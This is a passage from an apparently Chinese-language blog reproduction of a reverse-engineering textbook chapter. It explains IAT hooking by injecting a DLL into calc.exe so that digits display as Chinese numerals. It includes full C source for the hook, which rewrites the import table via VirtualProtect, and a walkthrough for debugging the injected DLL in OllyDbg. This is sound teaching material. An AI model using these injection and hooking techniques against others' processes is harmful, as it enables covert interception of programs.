src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC32%E7%AB%A0%20%E8%AE%A1%E7%AE%97%E5%99%A8%E6%98%BE%E7%A4%BA%E4%B8%AD%E6%96%87%E6%95%B0%E5%AD%97.assets/image-20220227111803252.png" alt="图32-14 IAT被钩取后的calc.exe进程"></p><p>从图32-14可以看到，输入的所有数字都被转换成了中文数字形式，并且计算器的计算功能也非常正常（请注意，我们只是钩取了数字的显示，除此之外其他功能均正常运行）。</p><p>下面尝试一下“脱钩”操作。“脱钩”就是把IAT恢复原值，弹岀并卸载已插入的DLL（hookiat.dll）。在命<br>令窗口中输入并执行图32-15中的命令。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC32%E7%AB%A0%20%E8%AE%A1%E7%AE%97%E5%99%A8%E6%98%BE%E7%A4%BA%E4%B8%AD%E6%96%87%E6%95%B0%E5%AD%97.assets/image-20220227112417353.png" alt="图32-15 从calc.exe进程卸载hookiat.dll"></p><p>执行完上述命令后，再次向计算器中输入数字，如图32-16所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC32%E7%AB%A0%20%E8%AE%A1%E7%AE%97%E5%99%A8%E6%98%BE%E7%A4%BA%E4%B8%AD%E6%96%87%E6%95%B0%E5%AD%97.assets/image-20220227112436172.png" alt="图32-16 “脱钩”后的calc.exe进程"></p><p>可以看到数字正常显示为阿拉伯数字形式，表明“脱钩”成功</p><h1 id="32-5-源代码分析"><a href="#32-5-源代码分析" class="headerlink" title="32.5 源代码分析"></a>32.5 源代码分析</h1><p>本节将详细分析示例程序（hookiat.dll）的源代码，借此深人了解IAT钩取的工作原理及具体实现方法。</p><blockquote><p>所有源代码均使用VC-H- 2010 Express Edition开发而成，且在Windows XP SP3、Windows 7 （32位）系统环境中顺利通过测试。为便于讲解，后面的源代码中省略了返回值检查与错误处理的语句。</p></blockquote><p>InjectDll.cpp源代码与以前讲解过的内容（注入DLL的代码）基本结构类似（详细说明请参考第23章）。下面将详细讲解hookiat.dll的源代码（hookiat.cpp）。</p><h2 id="32-5-1-DIIMain"><a href="#32-5-1-DIIMain" class="headerlink" title="32.5.1 DIIMain()"></a>32.5.1 DIIMain()</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c">BOOL WINAPI <span class="hljs-title function_">DllMain</span><span class="hljs-params">(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)</span><br>&#123;<br><span class="hljs-keyword">switch</span>( fdwReason )<br>&#123;<br><span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH : <br>            <span class="hljs-comment">// 保存原始API地址</span><br>           g_pOrgFunc = GetProcAddress(GetModuleHandle(<span class="hljs-string">L&quot;user32.dll&quot;</span>), <br>                                        <span class="hljs-string">&quot;SetWindowTextW&quot;</span>);<br><br>            <span class="hljs-comment">// # hook</span><br>            <span class="hljs-comment">//    用 hookiat!MySetWindowText() 钩取 user32!SetWindowTextW()</span><br>hook_iat(<span class="hljs-string">&quot;user32.dll&quot;</span>, g_pOrgFunc, (PROC)MySetWindowTextW);<br><span class="hljs-keyword">break</span>;<br><br><span class="hljs-keyword">case</span> DLL_PROCESS_DETACH :<br>            <span class="hljs-comment">// # unhook</span><br>            <span class="hljs-comment">//   将 calc.exe 的IAT恢复原值 </span><br>            hook_iat(<span class="hljs-string">&quot;user32.dll&quot;</span>, (PROC)MySetWindowTextW, g_pOrgFunc);<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></td></tr></table></figure><p>DllMain()函数代码一如既往地简单，下面看看其中比较重要的代码。</p><p>保存SetWindowTextW()地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH : <br>    <span class="hljs-comment">// 保存原始API地址</span><br>    g_pOrgFunc = GetProcAddress(GetModuleHandle(<span class="hljs-string">L&quot;user32.dll&quot;</span>), <br>                                <span class="hljs-string">&quot;SetWindowTextW&quot;</span>);<br></code></pre></td></tr></table></figure><p>在DLL_PROCESS_ATTACH事件中先获取user32.SetWindowTextW() API的地址，然后将其保存到全局变量（gjOrgFunc），后面“脱钩”时会用到这个地址。</p><blockquote><p>由于计算器已经加载了 user32.dll，所以像上面那样直接调用GetProcAddress()函数不会有什么问题。但实际操作中，必须先确定提供（要钩取的）API的DLL已经正常 加载到相应进程（若相应DLL在钩取前尚未被加载，则应该先调用LoadLirary() API加载它）。</p></blockquote><p>IAT钩取</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">hook_iat(<span class="hljs-string">&quot;user32.dll&quot;</span>, g_pOrgFunc, (PROC)MySetWindowTextW);<br></code></pre></td></tr></table></figure><p>上面这条语句用来调用hook_iat()函数，钩取IAT （即将user32.SetWindowTextW()的地址更改为hookiat.MySetWindowTextW()的地址）。上面这两个语句是发生DLL加载事件（DLL_PROCESS_ATTACH）时执行的所有操作。</p><p>IAT “脱钩”</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">case</span> DLL_PROCESS_DETACH :<br>    <span class="hljs-comment">// # unhook</span><br>    <span class="hljs-comment">//   将 calc.exe 的IAT恢复原值 </span><br>    hook_iat(<span class="hljs-string">&quot;user32.dll&quot;</span>, (PROC)MySetWindowTextW, g_pOrgFunc);<br></code></pre></td></tr></table></figure><p>卸载DLL时会触发DLL_PROCESS_DETACH事件，发生该事件时，我们将进行IAT “脱钩” （hookiat.MySetWindowTextW()的地址更改为user32.SetWindowTextW()的地址）。以上就是对DllMain()函数的讲解。接下来分析MySetWindowTextW()函数，它是user32.SetWindowTextW()的钩取函数（5.3节中将详细说明hook_iat()函数）。</p><h2 id="32-5-2-MySetWindowTextW"><a href="#32-5-2-MySetWindowTextW" class="headerlink" title="32.5.2 MySetWindowTextW()"></a>32.5.2 MySetWindowTextW()</h2><p>下面看看MySetWindowTextW()函数，它是SetWindowTextW()的钩取函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c">BOOL WINAPI <span class="hljs-title function_">MySetWindowTextW</span><span class="hljs-params">(HWND hWnd, LPWSTR lpString)</span><br>&#123;<br>    <span class="hljs-type">wchar_t</span>* pNum = <span class="hljs-string">L&quot;零一二三四五六七八九&quot;</span>;<br>    <span class="hljs-type">wchar_t</span> temp[<span class="hljs-number">2</span>] = &#123;<span class="hljs-number">0</span>,&#125;;<br>    <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>, nLen = <span class="hljs-number">0</span>, nIndex = <span class="hljs-number">0</span>;<br><br>    nLen = wcslen(lpString);<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; nLen; i++)<br>    &#123;<br>        <span class="hljs-comment">// 将阿拉伯数字转换为中文数字</span><br>        <span class="hljs-comment">//   lpString是宽字符版本（2个字节）字符串</span><br>        <span class="hljs-keyword">if</span>( <span class="hljs-string">L&#x27;0&#x27;</span> &lt;= lpString[i] &amp;&amp; lpString[i] &lt;= <span class="hljs-string">L&#x27;9&#x27;</span> )<br>        &#123;<br>            temp[<span class="hljs-number">0</span>] = lpString[i];<br>            nIndex = _wtoi(temp);<br>            lpString[i] = pNum[nIndex];<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// 调用user32!SetWindowTextW() API</span><br>    <span class="hljs-comment">//  (修改lpString缓冲区中的内容）</span><br>    <span class="hljs-keyword">return</span> ((PFSETWINDOWTEXTW)g_pOrgFunc)(hWnd, lpString);<br>&#125;<br></code></pre></td></tr></table></figure><p>计算器进程（calc.exe）的IAT被钩取后，每当代码中调用user32.SetWindowTextW()函数时，都会首先调用hookiat.MySetWindowTextW()函数。</p><p>接下来分析MySetWindowTextW()函数中的重要代码。MySetWindowTextW()函数的IpString参数是一块缓冲区，该缓冲区用来存放要输岀显示的字符串。所以，操作IpString参数即可在计算器中显示用户指定的字符串。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">nLen = wcslen(lpString);<br><span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; nLen; i++)<br>&#123;<br>    <span class="hljs-comment">// 将阿拉伯数字转换为中文数字</span><br>    <span class="hljs-comment">//   lpString是宽字符版本（2个字节）字符串</span><br>    <span class="hljs-keyword">if</span>( <span class="hljs-string">L&#x27;0&#x27;</span> &lt;= lpString[i] &amp;&amp; lpString[i] &lt;= <span class="hljs-string">L&#x27;9&#x27;</span> )<br>    &#123;<br>        temp[<span class="hljs-number">0</span>] = lpString[i];<br>        nIndex = _wtoi(temp);<br>        lpString[i] = pNum[nIndex];<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>上述for循环将存放在IpString的阿拉伯数字字符串转换为中文数字字符串。图35-17描述的是IpString缓冲区更改前后的情形。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC32%E7%AB%A0%20%E8%AE%A1%E7%AE%97%E5%99%A8%E6%98%BE%E7%A4%BA%E4%B8%AD%E6%96%87%E6%95%B0%E5%AD%97.assets/image-20220227113500565.png" alt="图32-17 更改IpString缓冲区的内容"></p><p>从图中可以看到，阿拉伯数字“123” 被更改为了中文数字“一二三”，即阿拉伯数字与中文数字是1 : 1的关系。利用这种特性可以不加任何修改地使用原缓冲区，也就是说，把阿拉伯数字转换为对应的中文数字时，缓冲区尺寸并未改变。从代码32-2中可知，IpString字符串的缓冲区中直接保存的是变换之后的（中文）字符串。</p><blockquote><p>若将阿拉伯数字“123” 更改为英文数字 “ONETWOTHREE”，显然英文数字要长得多，所以不能直接使用原缓冲区（123），而要先开辟一块新缓冲区，再将新缓冲区的地址传递给原始API。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">return</span> ((PFSETWINDOWTEXTW)g_pOrgFunc)(hWnd, lpString);<br></code></pre></td></tr></table></figure><p>for循环结束后，最后再调用函数指针g_pOrgFunc，它指向user32.SetWindowTextW()API的起始地址（该地址在DllMain()中已经获取并保存下来）。也就是说，调用原来的SetWindowTextW()函数，将（变换后的）中文数字显示在计算器的显示框中。总结一下MySetWindowTextW()函数：首先更改作为参数传递过来的IpString字符串缓冲区中的内容，然后调用SetWindowTextW()函数， 将lpString字符串缓冲区中的（更改后的）内容显示在计算器的显示框中。</p><p>下一小节将分析hook_iat()函数，它具体负责钩取IAT。</p><h2 id="32-5-3-hook-iat"><a href="#32-5-3-hook-iat" class="headerlink" title="32.5.3 hook_iat()"></a>32.5.3 hook_iat()</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs c">BOOL <span class="hljs-title function_">hook_iat</span><span class="hljs-params">(LPCSTR szDllName, PROC pfnOrg, PROC pfnNew)</span><br>&#123;<br>HMODULE hMod;<br>LPCSTR szLibName;<br>PIMAGE_IMPORT_DESCRIPTOR pImportDesc; <br>PIMAGE_THUNK_DATA pThunk;<br>DWORD dwOldProtect, dwRVA;<br>PBYTE pAddr;<br><br>    <span class="hljs-comment">// hMod, pAddr = ImageBase of calc.exe</span><br>    <span class="hljs-comment">//             = VA to MZ signature (IMAGE_DOS_HEADER)</span><br>hMod = GetModuleHandle(<span class="hljs-literal">NULL</span>);<br>pAddr = (PBYTE)hMod;<br><br>    <span class="hljs-comment">// pAddr = VA to PE signature (IMAGE_NT_HEADERS)</span><br>pAddr += *((DWORD*)&amp;pAddr[<span class="hljs-number">0x3C</span>]);<br><br>    <span class="hljs-comment">// dwRVA = RVA to IMAGE_IMPORT_DESCRIPTOR Table</span><br>dwRVA = *((DWORD*)&amp;pAddr[<span class="hljs-number">0x80</span>]);<br><br>    <span class="hljs-comment">// pImportDesc = VA to IMAGE_IMPORT_DESCRIPTOR Table</span><br>pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD)hMod+dwRVA);<br><br><span class="hljs-keyword">for</span>( ; pImportDesc-&gt;Name; pImportDesc++ )<br>&#123;<br>        <span class="hljs-comment">// szLibName = VA to IMAGE_IMPORT_DESCRIPTOR.Name</span><br>szLibName = (LPCSTR)((DWORD)hMod + pImportDesc-&gt;Name);<br><span class="hljs-keyword">if</span>( !_stricmp(szLibName, szDllName) )<br>&#123;<br>            <span class="hljs-comment">// pThunk = IMAGE_IMPORT_DESCRIPTOR.FirstThunk</span><br>            <span class="hljs-comment">//        = VA to IAT(Import Address Table)</span><br>pThunk = (PIMAGE_THUNK_DATA)((DWORD)hMod + <br>                                         pImportDesc-&gt;FirstThunk);<br><br>            <span class="hljs-comment">// pThunk-&gt;u1.Function = VA to API</span><br><span class="hljs-keyword">for</span>( ; pThunk-&gt;u1.Function; pThunk++ )<br>&#123;<br><span class="hljs-keyword">if</span>( pThunk-&gt;u1.Function == (DWORD)pfnOrg )<br>&#123;<br>                    <span class="hljs-comment">// 更改内存属性为 E/R/W</span><br>VirtualProtect((LPVOID)&amp;pThunk-&gt;u1.Function, <br>                                   <span class="hljs-number">4</span>, <br>                                   PAGE_EXECUTE_READWRITE, <br>                                   &amp;dwOldProtect);<br><br>                    <span class="hljs-comment">// 修改IAT值（钩取）</span><br>                    pThunk-&gt;u1.Function = (DWORD)pfnNew;<br><br>                    <span class="hljs-comment">// 恢复内存属性</span><br>                    VirtualProtect((LPVOID)&amp;pThunk-&gt;u1.Function, <br>                                   <span class="hljs-number">4</span>, <br>                                   dwOldProtect, <br>                                   &amp;dwOldProtect);<br><br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br></code></pre></td></tr></table></figure><p>该函数是具体执行IAT钩取的函数。函数代码虽然不长，但其中含有较多注释，使函数自身看上去较长。接下来逐一查看：hook_iat()函数的前半部分用来读取PE文件头信息，并查找IAT的位置（要理解这部分代码需要先了解IAT的结构）。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">hMod = GetModuleHandle(<span class="hljs-literal">NULL</span>); <span class="hljs-comment">// hMod = ImageBase</span><br>pAddr = (PBYTE)hMod;<span class="hljs-comment">// pAddr = ImageBase</span><br>pAddr += *((DWORD*)&amp;pAddr[<span class="hljs-number">0x3C</span>]);<span class="hljs-comment">// pAddr = &quot;PE&quot; signature</span><br>dwRVA = *((DWORD*)&amp;pAddr[<span class="hljs-number">0x80</span>]);<span class="hljs-comment">// dwRVA = RVA of IMAGE_IMPORT_DESCRIPTOR</span><br>pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD)hMod+dwRVA);<br></code></pre></td></tr></table></figure><p>上面这几行代码首先从ImageBase开始，经由PE签名找到IDT。plmportDesc变量中存储着IMAGE_IMPORT_DESCRIPTOR结构体的起始地址，后者是calc.exe进程IDT的第一个结构体。IDT是由IMAGE_IMPORT_DESCR!PTOR结构体组成的数组。若想查找到IAT,先要查找到这个位置。上面的代码中，plmportDesc变量的值为01012B80,使用PEView查看该地址，如图32-18所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC32%E7%AB%A0%20%E8%AE%A1%E7%AE%97%E5%99%A8%E6%98%BE%E7%A4%BA%E4%B8%AD%E6%96%87%E6%95%B0%E5%AD%97.assets/image-20220227122023028.png" alt="图32-18 calc.exe进程的IDT"></p><p>图32-18是计算器进程的IMAGE_IMPORT_DESCRIPTOR（数组），它在PEView中名为IDT。我们要查找的user32.dll位于图32-18的最下方，接下来使用for循环遍历该IDT。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span>( ; pImportDesc-&gt;Name; pImportDesc++ )<br>&#123;<br>    <span class="hljs-comment">// szLibName = VA to IMAGE_IMPORT_DESCRIPTOR.Name</span><br>    szLibName = (LPCSTR)((DWORD)hMod + pImportDesc-&gt;Name);<br>    <span class="hljs-keyword">if</span>( !_stricmp(szLibName, szDllName) )<br>    &#123;<br></code></pre></td></tr></table></figure><p>在上面的for循环中比较pImportDesc-&gt;Name与szDllName（“user32.dll”），通过比较查找到user32.dll的IMAGE_IMPORT_DESCRIPTOR结构体地址。最终plmportDesc的值为01012BE4 （参考图32-18）。接下来进入user32的IAT。pImportDesc-&gt;FirstThunk成员所指的就是IAT。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// pThunk = IMAGE_IMPORT_DESCRIPTOR.FirstThunk</span><br><span class="hljs-comment">//        = VA to IAT(Import Address Table)</span><br>pThunk = (PIMAGE_THUNK_DATA)((DWORD)hMod + <br>                             pImportDesc-&gt;FirstThunk);<br></code></pre></td></tr></table></figure><p>以上代码中，pThunk就是user32.dll的IAT （010010A4,参考图32-18）。使用PEView查看该地址，如图32-19所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC32%E7%AB%A0%20%E8%AE%A1%E7%AE%97%E5%99%A8%E6%98%BE%E7%A4%BA%E4%B8%AD%E6%96%87%E6%95%B0%E5%AD%97.assets/image-20220227122115207.png" alt="图32-19 calc.exe进程的IAT"></p><p>可以看到，user32.dll的IAT中导入了相当多的函数。我们要查找的SetWindowTextW位于010013F8地址处，其值为77D2612B。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// pThunk-&gt;u1.Function = VA to API</span><br><span class="hljs-keyword">for</span>( ; pThunk-&gt;u1.Function; pThunk++ )<br>&#123;<br>    <span class="hljs-keyword">if</span>( pThunk-&gt;u1.Function == (DWORD)pfnOrg )<br>    &#123;<br></code></pre></td></tr></table></figure><p>在上面的for循环中比较pThunk-&gt;ul.Function与pfnOrg （77D2612BSetWindowTextW的起始地址），准确查找到 SetWindowTextW 的 IAT 地址（010013F8）（当前 pThunk&#x3D;010013F8,pThunk-&gt;ul.Function&#x3D;77D2612B）。</p><p>上述代码就是从计算器进程的ImageBase开始查找user32.SetWindowTextW的IAT地址的整个过程。</p><blockquote><p>若不怎么理解上述代码，请参考第13章中有关IAT的部分，使用PEView逐一查找。</p></blockquote><p>查找到IAT地址后，接下来就要修改（hooking）它的值</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 修改IAT值（钩取）</span><br>pThunk-&gt;u1.Function = (DWORD)pfnNew;<br></code></pre></td></tr></table></figure><p>pThunk-&gt;ul.Function中，原来的值为77CF61C9 （SetWindowTextW地址），上面语句将其修改为（10001000 hookiat.MySetWindowTextW的地址）。这样，计算器代码调用user32.SetWindowTextW() API时，实际会先调用hookiat.MySetWindowTextW()函数。</p><blockquote><p>从上述hook_iat()函数代码中可以看到，钩取前先调用了 VirtualProtect()函数，将相应IAT的内存区域更改为“可读写”模式，钩取之后重新返回原模式的代码是存在的。该语句用来改变内存属性，由于计算器进程的IAT内存区域是只读的，所以需要使用该语句将其更改为“可读写”模式。</p></blockquote><p>对hook_iat.cpp代码的分析到此结束。如果理解了 IAT钩取的内部工作原理，再阅读hook_iat.cpp代码时就会感到很容易，理解起来也不会有什么难度。</p><h1 id="32-6-调试被注入的DLL文件"><a href="#32-6-调试被注入的DLL文件" class="headerlink" title="32.6 调试被注入的DLL文件"></a>32.6 调试被注入的DLL文件</h1><p>本节将使用OllyDbg调试钩取代码，并查看被钩取的IAT内存区域。此外还要学习如何调试注入进程的DLL文件。我们要调试的是hookiat.dll文件，它被注入计算器（calc.exe）进程。首先运行计算器程序，然后用Process Explorer查看计算器进程的PID值，如图32-20所示。</p><p>接下来将calc.exe进程附加到OllyDbg,如图32-21所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC32%E7%AB%A0%20%E8%AE%A1%E7%AE%97%E5%99%A8%E6%98%BE%E7%A4%BA%E4%B8%AD%E6%96%87%E6%95%B0%E5%AD%97.assets/image-20220227122805646.png" alt="图32-21 OllyDbg附加"></p><blockquote><p>我们使用的是OllyDbg 2.0版本，用OllyDbg 1.10调试被注入的DLL会遇到一些Bug,导致调试进程意外终止。</p></blockquote><p>附加成功后，按F9运行键运行calc.exe进程。然后设置OllyDbg选项，如图32-22所示。这样，注入DLL文件（hookiat.dll）时，控制权就会转给调试器。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC32%E7%AB%A0%20%E8%AE%A1%E7%AE%97%E5%99%A8%E6%98%BE%E7%A4%BA%E4%B8%AD%E6%96%87%E6%95%B0%E5%AD%97.assets/image-20220227124930776.png" alt="图32-22 复选Pause on new module (DLL)选项"></p><p>如图32-22所示，在OllyDbg的Options窗口中复选Pause on new module （DLL）选项后，每当有DLL加载（含注入）到被调试进程时，控制权就会转移给调试器。设置好选项后，在OllyDbg中按F9运行键正常运行计算器进程。在命令行窗口中输入相应参数，运行InjectDll.exe，将hookiat.dll注入计算器进程（参考图32-23）。</p><blockquote><p>这里使用了VS，命令行会注入失败。</p></blockquote><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC32%E7%AB%A0%20%E8%AE%A1%E7%AE%97%E5%99%A8%E6%98%BE%E7%A4%BA%E4%B8%AD%E6%96%87%E6%95%B0%E5%AD%97.assets/image-20220227123304955.png" alt="图32-23 注入hookiat.dll"></p><p>calc.exe进程中发生DLL加载事件时，相关事件就会被通知到OllyDbg，如图32-22所示设置好选项后，调试器就会在hookiat.dll的EP处暂停下来，如图32-24所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC32%E7%AB%A0%20%E8%AE%A1%E7%AE%97%E5%99%A8%E6%98%BE%E7%A4%BA%E4%B8%AD%E6%96%87%E6%95%B0%E5%AD%97.assets/image-20220227134143100.png" alt="图32-24 hookiat.dll的EP代码"></p><blockquote><p>有DLL被加载时，调试器会自动暂停在被加载的DLL的EP处，这是OllyDbg2.0中提供的功能。若使用的是OllyDbg1.1,调试器会在非EP的其他代码位置处（ntdll.dll 区域）暂停。</p></blockquote><p>接下来，取消图32-22中复选的Pause on new module （DLL）选项，查找DllMain()代码。</p><p>在调试器中查找hookiat.dll的DllMain()函数最简单的方法是，检索DllMain()中使用的字符串或API （当然也可以使用Step In（F7）命令逐行跟踪查找）。参考代码32-1可知，DllMain()函数中使用的字符串有“user32.dll”与“SetWindowTextW”。下面通过查找代码中使用的“user32.dll”与 “SetWindowTextW”字符串来找DllMain()函数。在OllyDbg的代码窗口中选择鼠标右键菜单Search for All referenced strings选项，如图32-25所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC32%E7%AB%A0%20%E8%AE%A1%E7%AE%97%E5%99%A8%E6%98%BE%E7%A4%BA%E4%B8%AD%E6%96%87%E6%95%B0%E5%AD%97.assets/image-20220227134220849.png" alt="图32-25 査找字符串"></p><p>从图32-25可知，“user32.dll”字符串有2处，“SetWindowTextW”字符串有1处。转到引用“SetWindowTextW”字符串的代码地址1ED112E处，如图32-26所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC32%E7%AB%A0%20%E8%AE%A1%E7%AE%97%E5%99%A8%E6%98%BE%E7%A4%BA%E4%B8%AD%E6%96%87%E6%95%B0%E5%AD%97.assets/image-20220227134248129.png" alt="图32-26 DllMain()代码"></p><p>图32-26黑色线框中的反汇编代码与代码32-1中的C语言代码是一致的。因此该部分（1ED1120~）就是DllMain()函数（DllMain()函数的起始地址为1ED1120）。这就是调试注入进程的DLL的方法。</p><h2 id="32-6-1-DIIMain"><a href="#32-6-1-DIIMain" class="headerlink" title="32.6.1 DIIMain()"></a>32.6.1 DIIMain()</h2><p>下面从DllMain()函数起始位置开始调试（与代码32-1比较查看，理解起来会更容易）。继续调试DllMain(),出现如图32-27所示的代码。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC32%E7%AB%A0%20%E8%AE%A1%E7%AE%97%E5%99%A8%E6%98%BE%E7%A4%BA%E4%B8%AD%E6%96%87%E6%95%B0%E5%AD%97.assets/image-20220227135247248.png" alt="图32-27 调用hook_iat()函数"></p><p>地址1ED1151处的CALL hook_iat指令就是调用hook_iat()函数的部分。由于函数参数逆序存储在栈中，所以各参数含义与注释的描述一样（请比较代码32-1与图32-27）。需要注意的是，在代码32-1中可以看到hook_iat()函数有3个参数，而图32-27中的hook_iat()的参数只有2个。</p><blockquote><p>从栈窗口中可以清楚地看到这一点，需要注意的是栈中只有一个参数。另一个参数是原始函数的地址，它通过EDX寄存器进行传递，这是通过指令<code>MOV EDX,EAX</code>完成的。这就是所谓的寄存器传参。</p></blockquote><p>仔细查看可以发现，hook_iat()的第一个参数“user32.dll”字符串 的地址和原始函数的地址被省略了。这是VC++编辑器进行代码优化的结果，字符串的地址（4字节常数）并未作为函数参数传入，而被硬编码到hook_iat()函数中。大家以后调试自己编写的程序时，会经常遇到上述代码优化现象。</p><h2 id="32-6-2-hook-iat"><a href="#32-6-2-hook-iat" class="headerlink" title="32.6.2 hook_iat()"></a>32.6.2 hook_iat()</h2><p>hook_iat()是具体负责实施IAT钩取的核心函数，下面开始调试它。</p><p><strong>查找IMAGE_IMPORT_DESCRIPTION</strong></p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC32%E7%AB%A0%20%E8%AE%A1%E7%AE%97%E5%99%A8%E6%98%BE%E7%A4%BA%E4%B8%AD%E6%96%87%E6%95%B0%E5%AD%97.assets/image-20220227140027407.png" alt="图32-28 査找IMAGE_IMPORT_DESCRIPTION"></p><p>图32-28灰色部分代码描述了从PE文件头中查找IMAGE_IMPORT_DESCRIPTION Table （下 称“IID Table”）的过程（在PEView中可以看到多个IID—起组成了IDT）。以上代码（1ED1093~1ED10A5）仅用6条汇编指令就找到了IID 